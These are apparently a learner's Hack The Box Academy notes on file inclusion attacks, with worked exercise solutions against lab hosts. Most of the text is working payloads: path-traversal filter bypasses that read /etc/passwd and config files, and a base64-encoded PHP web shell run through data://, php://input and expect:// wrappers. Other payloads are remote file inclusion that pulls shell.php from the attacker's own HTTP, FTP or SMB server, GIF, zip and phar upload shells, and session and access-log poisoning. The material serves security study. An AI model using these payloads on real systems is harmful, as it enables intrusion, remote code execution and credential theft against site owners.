## Introduction
#### Intro to File Inclusions
```
## Local File Inclusion (LFI)

## Examples of vulnerable code
- PHP
if (isset($_GET['language'])) {
    include($_GET['language']);
}

- NodeJS
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}

app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});

- Java
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>

<c:import url= "<%= request.getParameter('language') %>"/>

- .NET
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}

@Html.Partial(HttpContext.Request.Query['language'])

<!--#include file="<% HttpContext.Request.Query['language'] %>"-->

## Read vs Execute
- Some function grants read permission, while some grants execute, which can may allow RCE
- Picture of function show below: 
```

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
| `require()`/`require_once()` |        ✅         |      ✅      |       ❌        |
| `file_get_contents()`        |        ✅         |      ❌      |       ✅        |
| `fopen()`/`file()`           |        ✅         |      ❌      |       ❌        |
| **NodeJS**                   |                  |             |                |
| `fs.readFile()`              |        ✅         |      ❌      |       ❌        |
| `fs.sendFile()`              |        ✅         |      ❌      |       ❌        |
| `res.render()`               |        ✅         |      ✅      |       ❌        |
| **Java**                     |                  |             |                |
| `include`                    |        ✅         |      ❌      |       ❌        |
| `import`                     |        ✅         |      ✅      |       ✅        |
| **.NET**                     |                  |             |                |
| `@Html.Partial()`            |        ✅         |      ❌      |       ❌        |
| `@Html.RemotePartial()`      |        ✅         |      ❌      |       ✅        |
| `Response.WriteFile()`       |        ✅         |      ❌      |       ❌        |
| `include`                    |        ✅         |      ✅      |       ✅        |

## File Disclosure
#### Local File Inclusion (LFI)
```
## Basic LFI
- Identified a website that can switch language (with the parametetr changing on the top)

- Common readable files are /etc/passwd on Linux and C:\Windows\boot.ini

## Path Traversal
- php code example:
	- Can read from absolute path
include($_GET['language']);
	- Can't read from absolute path
include("./languages/" . $_GET['language']);

**Note:** We are only enabling PHP errors on this web application for educational purposes, so we can properly understand how the web application is handling our input. For production web applications, such errors should never be shown. Furthermore, all of our attacks should be possible without errors, as they do not rely on them

- Use of relative path:
../../../../etc/passwd

**Tip:** It can always be useful to be efficient and not add unnecessary `../` several times, especially if we were writing a report or writing an exploit. So, always try to find the minimum number of `../` that works and use it. You may also be able to calculate how many directories you are away from the root path and use that many. For example, with `/var/www/html/` we are `3` directories away from the root path, so we can use `../` 3 times (i.e. `../../../`).

## Filename Prefix
- Example php code:
include("lang_" . $_GET['language']);
-> `../../../etc/passwd` wouldn't work

**Note:** This may not always work, as in this example a directory named `lang_/` may not exist, so our relative path may not be correct. Furthermore, `any prefix appended to our input may break some file inclusion techniques` we will discuss in upcoming sections, like using PHP wrappers and filters or RFI.

## Appended Extensions
- Example PHP code:
include($_GET['language'] . ".php");

## Second-Order Attacks
- A two step procedure:
	- e.g:
	1. Create username with value like ../../../etc/passwd
	2. pull file from the websie
	- However certain conditions have to me as well. 

**Note:** All techniques mentioned in this section should work with any LFI vulnerability, regardless of the back-end development language or framework.

## Questions
Q1. 

- Try asbolute path inject:
/etc/passwd -> no response

- Try relative path
../../../../etc/passwd
-> bypassed and found barry

Q2
../../../../usr/share/flags
```

## Basic Bypasses
```
## Non-recursive Path traversal Filters
- Example php code:
$language = str_replace('../', '', $_GET['language']);
	-> problem: Not recursively removing the ../ substring

- Bypass payload:
....//
..././
....\/

E.g. Bypassing filter:
....//....//....//....//etc/passwd

## Encoding
- Some filter can be bypassed through url encoding (lack of decoding)

E.g. payload
../ ->(url encode) %2e%2e%2f

**Note:** For this to work we must URL encode all characters, including the dots. Some URL encoders may not encode dots as they are considered to be part of the URL scheme.

## Approved Paths
- Example PHP code:
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}

- By through including the folder name at the front.

- E.g. bypass
./languages/../../../../etc/passwd

**Note:** All techniques mentioned so far should work with any LFI vulnerability, regardless of the back-end development language or framework.

## Appended Extension
- Path truncation:
	- idea:
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]

	- Script to create payload:
areaeric@htb[/htb]$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done

	-> For PHP version before 5.3/5.4

- Null Bytes
	- Insert null byte so it doesn't get read:
	- e.g. bypass:
	/etc/passwd%00 -> /etc/passwd%00.php
	
	-> For PHP version before 5.5

## Exercises:
- Try bypass non-recursive payload with approved path:
....//....//....//....//etc/passwd
-> vulnerable to lfi

....//....//....//....//flag.txt
```

#### PHP Filters
```
## Input filter
- Filter is like a function that does lots of thing under the hood (abstraction).
- Filter useful for LFI is convert.base64-encode filter

## Fuzzing for PHP files
- Fuzz for available PHP pages
areaeric@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php

**Tip:** Unlike normal web application usage, we are not restricted to pages with HTTP response code 200, as we have local file inclusion access, so we should be scanning for all codes, including `301`, `302` and `403` pages, and we should be able to read their source code as well.

- Scan them (source of identified file) for other referenced PHP files and then read those as well. 
- E.g. Start by reading index.php and scanning for more references.

## Standard PHP Inclusion
- Try and include the available file and see what happens.
- Most of the time interested in reading the source file.

**Note:** The same applies to web application languages other than PHP, as long as the vulnerable function can execute files. Otherwise, we would directly get the source code, and would not need to use extra filters/functions to read the source code. Refer to the functions table in section 1 to see which functions have which privileges.

## Source Code Disclosure
- Reading config (file identified through fuzzing) file:
php://filter/read=convert.base64-encode/resource=config

**Note:** We intentionally left the resource file at the end of our string, as the `.php` extension is automatically appended to the end of our input string, which would make the resource we specified be `config.php`.

- Base 64 decoding:
areaeric@htb[/htb]$ echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d

**Tip:** When copying the base64 encoded string, be sure to copy the entire string or it will not fully decode. You can view the page source to ensure you copy the entire string.

## Question
- Changed language to english to see that the website maybe vulnerable to LFI.

- Fuzzing for PHP file
ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -ic -u http://94.237.54.170:30856/FUZZ.php
-> index, en, es, configure

- Standard PHP inclusion on configure
http://94.237.54.170:30856/index.php?language=configure
-> brings nothing

- Source Code Disclosure on configure
php://filter/read=convert.base64-encode/resource=configure

-> base64 source:
PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0+ICdibG9nZGInCik7CgokQVBJX0tFWSA9ICJBd2V3MjQyR0RzaHJmNDYrMzUvayI7 

	- Base 64 decoding:
echo 'PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0+ICdibG9nZGInCik7CgokQVBJX0tFWSA9ICJBd2V3MjQyR0RzaHJmNDYrMzUvayI7 ' | base64 -d

-> $config = array(
  'DB_HOST' => 'db.inlanefreight.local',
  'DB_USERNAME' => 'root',
  'DB_PASSWORD' => 'HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}',
  'DB_DATABASE' => 'blogdb'
);
```

## Remote Code Exection
#### PHP Wrappers
```
## Data
- Checking PHP Configuration
	-> Check files at `/etc/php/X.Y/apache2/php.ini` for Apache or at `/etc/php/X.Y/fpm/php.ini` for Nginx, where X.Y is the installed PHP version

- Use base64 filter to avoid breaking the page.

- Use cURl or Burp instead of browser, as the output page maybe long and break the page:
areaeric@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

- Check for allow_url_include:
areaeric@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

- Remote code execution
areaeric@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64

- Performing the RCE:
	-> Go to url format:
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

	-> With cURL:
areaeric@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid

## Input
- Similar to data wrapper, but pass the input wrapper as a post request's data

areaeric@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid

**Note:** To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use `$_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<\?php system('id')?>`)

## Expect
- An external wrapper class that need to manually downloaded.
- Need to searh verify it's installed and enabled:
areaeric@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect

areaeric@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"

## Questions
-> Page is vulnerable to a weak LFI

-## Data wrapper

- Using whether wrapper is enabled (using burp):
curl "http://83.136.253.251:56930/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

- reading the file (taking care of white spaces)
cat filters_ex_base64 | tr -d " " |  base64 -d | grep allow_url_include
-> allow_url_include = on

- Create base64 php code:
echo '<?php system($_GET["cmd"]); ?>' | base64
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==

- Performing the RCE (copy from cmd sheet or construct by yourself, then url encode as URL special character and also encode space as %2B)
http://83.136.253.251:56930/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

- Getting flag
http://83.136.253.251:56930/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls%20/%2F

http://83.136.253.251:56930/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat%20%2F37809e2f8952f06139011994726d9ef1%2Etxt

-## playing with other cmd7/alternative sols
- Input
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://83.136.253.251:56930/index.php?language=php://input&cmd=id" | grep uid

curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://83.136.253.251:56930/index.php?language=php://input&cmd=cat%20%2F37809e2f8952f06139011994726d9ef1%2Etxt"

-## Expect
cat filters_ex_base64 | tr -d " " |  base64 -d | grep expect
-> Expect enabled

http://83.136.253.251:56930/index.php?language=expect://id
-> but didn't work
```

#### Remote File Inclusion (RFI)
```
## Local vs. Remote File Inclusion
- An RFI is automatically an LFI, but the converse does not necessarily hold.

## Verify RFI
- Check for allow_url_include:
areaeric@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

- Include an local URL (http://127.0.0.1:80/index.php) to double check:
enter url to be something like http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php

**Note:** It may not be ideal to include the vulnerable page itself (i.e. index.php), as this may cause a recursive inclusion loop and cause a DoS to the back-end server.

## Remote Code Execution with RFI
- Create a shell script:
areaeric@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php

## HTTP
- Start a python server:
areaeric@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>

- Executing commands:
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id

- Output on python server:
areaeric@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...

SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -

**Tip:** We can examine the connection on our machine to ensure the request is being sent as we specified it. For example, if we saw an extra extension (.php) was appended to the request, then we can omit it from our payload

## FTP
- Starting a webserver
areaeric@htb[/htb]$ sudo python -m pyftpdlib -p 21

- May be useful in bypassing an WAF (if http gets blocked)

- Executing commands:
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id

- Authenticating as credentialed user
areaeric@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
...SNIP...
uid=33(www-data) gid=33(www-data) groups=33(www-data)

## SMB
- For Windows server, dodn't need allow_url_include

- Starting a smb share server:
areaeric@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)

- Executing the command:
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami

- more likely to work if we are on the same internet, as accessing remote SMBs server may be disabled by default. 

## Questions
- Identified an LFI through the language parameter

-## Verify RFI

 - From what we obtained last section (the base64 blob, we see that allow_url_include is enabled)
cat filters_ex_base64 | tr -d " " |  base64 -d | grep allow_url_include

 - Include an remote URL:
	 language=http://127.0.0.1:80/index.php
 -> Confirmed to have RFI

-## RCE with RFI:
echo '<?php system($_GET["cmd"]); ?>' > shell.php

-## HTTP
 - Start a server
sudo python3 -m http.server 80

 - Executing commands:
http://10.129.29.114/index.php?language=http://10.10.16.12:80/shell.php&cmd=id
-> got id

 - Getting flag
http://10.129.29.114/index.php?language=http://10.10.16.12:80/shell.php&cmd=ls /

http://10.129.29.114/index.php?language=http://10.10.16.12:80/shell.php&cmd=ls /exercise

http://10.129.29.114/index.php?language=http://10.10.16.12:80/shell.php&cmd=cat /exercise/flag.txt

-## other techniques playing around

-## FTP
 - Starting ftp server
sudo python -m pyftpdlib -p 21

 - Executing commands
http://10.129.29.114/index.php?language=ftp://10.10.16.12/shell.php&cmd=id

-> SMB techniques not attempted as it is likely not a windows server. 
```

#### LFI and File Uploads
```
## Image upload
- Vulnerability lies in LFI and not the upload functionality

- Crafting Malicious image
areaeric@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

**Note:** We are using a `GIF` image in this case since its magic bytes are easily typed, as they are ASCII characters, while other extensions have magic bytes in binary that we would need to URL encode. However, this attack would work with any allowed image or file type. The [File Upload Attacks](https://academy.hackthebox.com/module/details/136) module goes more in depth for file type attacks, and the same logic can be applied here.

- Upload malicious image file given the functionality

- Upload File Path: Inspect the source code
	- e.g. 
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">

**Note:** As we can see, we can use `/profile_images/shell.gif` for the file path. If we do not know where the file is uploaded, then we can fuzz for an uploads directory, and then fuzz for our uploaded file, though this may not always work as some web applications properly hide the uploaded files.

- Code execution:
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id

**Note:** To include to our uploaded file, we used `./profile_images/` as in this case the LFI vulnerability does not prefix any directories before our input. In case it did prefix a directory before our input, then we simply need to `../` out of that directory and then use our URL path, as we learned in previous sections.

## Zip Upload
- Utilize the zip wrapper to execute PHP code

- Creating a zip archive called shell.jpg
areaeric@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php

**Note:** Even though we named our zip archive as (shell.jpg), some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed.

- Executing the code with zip wrapper with url-encoding:
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id

**Note:** We added the uploads directory (`./profile_images/`) before the file name, as the vulnerable page (`index.php`) is in the main directory.

## Phar upload
- Using the phar (PHP archive) wrapper to achieve similar result

- Write the following as shell.php:
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();

- Compiling the archive as shell.jpg
areaeric@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg

- Executing RCE:
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id

- use the phar and zip method as an alternative method when the first method doesn't

**Note:** There is another (obsolete) LFI/uploads attack worth noting, which occurs if file uploads is enabled in the PHP configurations and the `phpinfo()` page is somehow exposed to us. However, this attack is not very common, as it has very specific requirements for it to work (LFI + uploads enabled + old PHP + exposed phpinfo()). If you are interested in knowing more about it, you can refer to [This Link](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo).

## Questions
- Find a place where we can upload images.

## Attempting image upload:
 - Crafting Malicious image
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

 - Upload File Path: Inspect the source code after upload and refreshing:
	-> /profile_images/shell.gif

 - Code execution:
http://94.237.49.182:31199/index.php?language=./profile_images/shell.gif&cmd=id

 - Getting flag
http://94.237.49.182:31199/index.php?language=./profile_images/shell.gif&cmd=ls /

http://94.237.49.182:31199/index.php?language=./profile_images/shell.gif&cmd=cat /2f40d853e2d4768d87da1c81772bae0a.txt

## Playing around with alternative method

-## Zip wrapper
- Creating a zip archive called shell.jpg
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php

- Upload image

- Executing the code with zip wrapper with url-encoding:
http://94.237.49.182:31199/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id

-## Phar upload
- Write the following as shell_phar.php:
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();

- Compiling the archive as shell_phar.jpg
php --define phar.readonly=0 shell_phar.php && mv shell.phar shell_phar.jpg

- Upload image

- Executing RCE:
http:///94.237.49.182:31199/index.php?language=phar://./profile_images/shell_phar.jpg%2Fshell.txt&cmd=id
```

#### Log Poisoning
```
- Attacks work like we can poison the log file with out inputs and include it using some LFI.

## PHP Session Poisoning
- Location of cookie:
	- e.g. On Linux php:
	- /var/lib/php/sessions/
	- on Windows:
	- C:\Windows\Temp\

	- e.g. cookie of value of el4ukv0kqbvoirg7nkp4dncpk3 means thta location on disk would be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3

- Perform LFI on session cookie and see that it stores 2 values:
	page and preference,
	where we have control of the page parameter through the ?language= parameter

- Perform testing on custom value and see whether the session file includes it:
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning

- Now include the session file again to look at the content:
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd

- Writing a webshell to the cookie file:
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E

- Include the session file and execute command on it:
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id

Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.

## Server Log Poisoning
- Apache and Nginx maintains various log file, such as access.log and error.log.
- we are most interesting in access.log as it logs all our request
	- Be aware of '' for webshell writing, due to "" utilisied in the log.

- Log default location:
	- Apache: /var/log/apache2/ , C:\xampp\apache\logs\
	- Nginx: /var/log/nginx/ , C:\nginx\log\
	- Note: There may be privilege issue when trying to read as a low privileg user, so need to be aware of it (e.g. reading Apache log file as low privilege user)

- Reading Apache access.log
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log

**Tip:** Logs tend to be huge, and loading them in an LFI vulnerability may take a while to load, or even crash the server in worst-case scenarios. So, be careful and efficient with them in a production environment, and don't send unnecessary requests.

- use Burp suite to intercept LFI request and modify user agent to Apache Log poisoning

- Poison by sending a web-shell on the user-agent
or
- Poison by cURL:
areaeric@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"

- Execute command through LFI on log file (using burp to capture):
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id

**Tip:** The `User-Agent` header is also shown on process files under the Linux `/proc/` directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.

- We may also attempt to read such logs through LFI, using the same technique:
	- /var/log/sshd.log
	- /var/log/mail
	- /var/log/vsftpd.log
- We can even generalise this to any logs that log a parameter we control and that we can read through the LFI vulnerability. 

## Questions
- Identified an LFI vulnerbility on the language parameter

-## PHP Session Poisoning
 - Perform LFI on cookie: pil7j3510hmm3og5iti7j2tfi9:
language=../../../../var/lib/php/sessions/sess_pil7j3510hmm3og5iti7j2tfi9

	-> We can manipulate the selected_languauge parameter

 - Write a webshell to the log file (url encoded):
language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E

- Include the session file and execute command on it:
http://94.237.63.93:30172/index.php?language=/var/lib/php/sessions/sess_pil7j3510hmm3og5iti7j2tfi9&cmd=pwd
-> Q1 finish

- Unsure if it is nginx or apache, so reading access log file from apache first:

- Access log file through apache:
http://94.237.63.93:30172/index.php?language=/var/log/apache2/access.log


- Poison by sending a web-shell on the user-agent
or
- Poison by cURL:
areaeric@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"

- Execute command through LFI on log file (using burp to capture):
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id

- Getting flag
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=ls%20/

GET /index.php?language=/var/log/apache2/access.log&cmd=cat+/c85ee5082f4c723ace6c0796e3a3db09.txt 
```

## Automation and Prevention
#### Automated Scanning
```
## Fuzzing Parameters
- Fuzzing the page for common GET parameters (with filter on default values):
areaeric@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287

- Important to test for exposed parameters through fuzzing, as they tend to be less secure then public ones, like ones associated with HTML forms

**Tip:** For a more precise scan, we can limit our scan to the most popular LFI parameters found on this [link](https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters).

## LFI wordlists
- Using good wordlist to test for LFI vulnerability:
areaeric@htb[/htb]$ ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287

## Fuzzing Server Files
- Attempt to identify location of useful files so we can read them (e.g. `Server webroot path`, `server configurations file`, and `server logs`.)

- Server Webroot
	-> Locating server webroot, could be helpful in locating directory in absolute path 
areaeric@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287

	- LFI-Jhaddix.txt could be helpful as well.
	- Reading server configuration files could also be helpful.

- Server Logs/Configuration
	-> running precise scan on Linux wordlist:
areaeric@htb[/htb]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287

	-> Obtained:
/etc/hosts              [Status: 200, Size: 2461, Words: 636, Lines: 72]
/etc/hostname           [Status: 200, Size: 2300, Words: 634, Lines: 66]
/etc/login.defs         [Status: 200, Size: 12837, Words: 2271, Lines: 406]
/etc/fstab              [Status: 200, Size: 2324, Words: 639, Lines: 66]
/etc/apache2/apache2.conf [Status: 200, Size: 9511, Words: 1575, Lines: 292]
/etc/issue.net          [Status: 200, Size: 2306, Words: 636, Lines: 66]
...SNIP...
/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 3036, Words: 715, Lines: 94]
/etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 3130, Words: 748, Lines: 89]
/etc/apache2/envvars    [Status: 200, Size: 4069, Words: 823, Lines: 112]
/etc/adduser.conf       [Status: 200, Size: 5315, Words: 1035, Lines: 153]

	- Reading Apache configuration file and obtaining log file location and webroot
areaeric@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf


...SNIP...
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
...SNIP...

-> Reading environment variable values through /etc/apache2/envars
areaeric@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars

...SNIP...
export APACHE_RUN_USER=www-data
export APACHE_RUN_GROUP=www-data
# temporary state file location. This might be changed to /run in Wheezy+1
export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pid
export APACHE_RUN_DIR=/var/run/apache2$SUFFIX
export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX
# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.
export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
...SNIP...

**Note:** Of course, we can simply use a wordlist to find the logs, as multiple wordlists we used in this sections did show the log location. But this exercises shows us how we can manually go through identified files, and then use the information we find to further identify more files and important information. This is quite similar to when we read different file sources in the `PHP filters` section, and such efforts may reveal previously unknown information about the web application, which we can use to further exploit it.

##  LFI tools
- Additional tools like [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy) could be used

## Questions

-## Fuzzing Parameters
 - Fuzzing the page for common GET parameters (with filter on default values):
ffuf -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://83.136.252.32:33222/index.php?FUZZ=value'
	-> fs=2309
	
ffuf -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://83.136.252.32:33222/index.php?FUZZ=value' -fs 2309
	-> Parameter fuzzed: view

-## LFI wordlists
 - Using good wordlist to test for LFI vulnerability:
ffuf -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://83.136.252.32:33222/index.php?view=FUZZ'
	-> fs=1935

ffuf -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://83.136.252.32:33222/index.php?view=FUZZ' -fs 1935
	-> LFI vulnerability: ../../../../../../../../../../../../../../../../../etc/passwd

-## Fuzzing Server Files
 - Server Webroot
	-> Locating server webroot with LFI payload:
ffuf -w /opt/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://83.136.252.32:33222/index.php?view=../../../../../../../../../../../../../../../../../FUZZ/index.php' -fs 1935
	-> Webroot: var/www/html/

- Server Logs/Configuration
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://83.136.252.32:33222/index.php?view=../../../../../../../../../../../../../../../../../FUZZ' -fs 1935
	-> Obtained useful file location: 
		/etc/apache2/apache2.conf
		/etc/apache2/envvars

- Reading log file:
curl http://83.136.252.32:33222/index.php?view=../../../../../../../../../../../../../../../../../etc/apache2/apache2.conf
	->Nothing too interesting.

- I'm guessing it's to read the flag.txt that could be at /var/www/html (based on feeling of this question)
curl http://83.136.252.32:33222/index.php?view=../../../../../../../../../../../../../../../../../var/www/html/flag.txt

- Didn't work, So I tried all common directory and found it at /
